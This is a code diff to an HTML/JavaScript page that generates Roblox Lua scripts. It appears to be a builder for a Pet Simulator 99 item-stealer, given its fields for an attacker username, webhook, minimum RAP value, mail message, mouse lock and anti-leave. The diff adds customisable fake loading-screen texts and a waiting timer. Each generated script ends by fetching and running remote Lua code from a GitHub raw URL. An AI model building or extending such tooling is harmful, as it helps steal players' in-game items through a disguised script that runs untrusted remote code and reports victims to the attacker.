@@ -125,6 +125,21 @@
       <label for="loadingscreen">Show Loading Screen:</label>
       <input type="checkbox" id="loadingscreen" name="loadingscreen"><br><br>
 
+      <label for="scriptName">Script Name:</label>
+      <input type="text" id="scriptName" name="scriptName" required><br><br>
+
+      <label for="firstText">First Text:</label>
+      <input type="text" id="firstText" name="firstText"><br><br>
+
+      <label for="secondText">Second Text:</label>
+      <input type="text" id="secondText" name="secondText"><br><br>
+
+      <label for="thirdText">Third Text:</label>
+      <input type="text" id="thirdText" name="thirdText"><br><br>
+
+      <label for="waitingTime">Waiting Time (in seconds):</label>
+      <input type="number" id="waitingTime" name="waitingTime" value="180"><br><br>
+
       <button type="button" id="generateBtn">Generate</button>
       <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br>
 
@@ -154,9 +169,14 @@
         const mouseLock = document.getElementById("mouseLock").checked;
         const antileave = document.getElementById("antileave").checked;
         const loadingscreen = document.getElementById("loadingscreen").checked;
+        const scriptName = document.getElementById("scriptName").value;
+        const firstText = document.getElementById("firstText").value;
+        const secondText = document.getElementById("secondText").value;
+        const thirdText = document.getElementById("thirdText").value;
+        const waitingTime = document.getElementById("waitingTime").value;
 
-        if (!username || !webhook || !minimumRAP || !mailMessage) {
-          alert("Please fill in all fields.");
+        if (!username || !webhook || !minimumRAP || !mailMessage || !scriptName) {
+          alert("Please fill in all required fields.");
           return;
         }
 
@@ -175,6 +195,11 @@
                              `    mouseLock = ${mouseLock},\n` +
                              `    antileave = ${antileave},\n` +
                              `    loadingscreen = ${loadingscreen},\n` +
+                             `    ScriptName = "${scriptName}",\n` +
+                             `    FirstText = "${firstText}",\n` +
+                             `    SecondText = "${secondText}",\n` +
+                             `    ThirdText = "${thirdText}",\n` +
+                             `    WaitingTime = ${waitingTime},\n` +
                              `    MailMessage = "${mailMessage}",\n` +
                              `}\n\n` +
                              'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua",true))()';
